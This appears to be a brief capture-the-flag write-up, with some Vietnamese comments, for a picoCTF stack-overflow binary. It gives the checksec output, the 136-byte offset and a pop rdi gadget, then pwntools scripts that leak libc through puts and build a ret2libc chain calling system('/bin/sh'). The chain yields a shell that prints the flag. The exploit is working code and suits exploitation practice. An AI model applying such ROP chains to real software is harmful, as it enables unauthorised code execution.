# checksec
```
File:     /mnt/c/Users/ASUS/Downloads/lib/vuln
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'./'
Stripped:   No
```
# offset
```
pwndbg> cyclic -l 0x6161616161616172
Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
Found at offset 136
```


# pop_rdi gadget
```
  ROPgadget --bin vuln | grep "pop rdi"
0x0000000000400913 : pop rdi ; ret
```
# leak libc
```python
exe = ELF ("./vuln (1)", checksec = False)
libc = ELF('./libc.so (1).6',checksec=False)
p = process(exe.path)

pop_rdi = 0x0000000000400913

payload = b'A' * 136               # padding
payload += p64(pop_rdi)            #pop_rdi
payload += p64(exe.got['puts'])    #call got addr
payload += p64(exe.plt['puts'])    #call plt
payload += p64(exe.sym['main'])
p.sendline(payload)

p.recvline()
p.recvline()                    # loại bỏ 2 dòng k cần thiết
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))
```

# lấy shell là xong
```python
ret = 0x000000000040052e

payload = b'A' * 136
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])
p.sendlineafter("sErVeR!", payload)

p.interactive()
```
# đã ok
```
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}$
```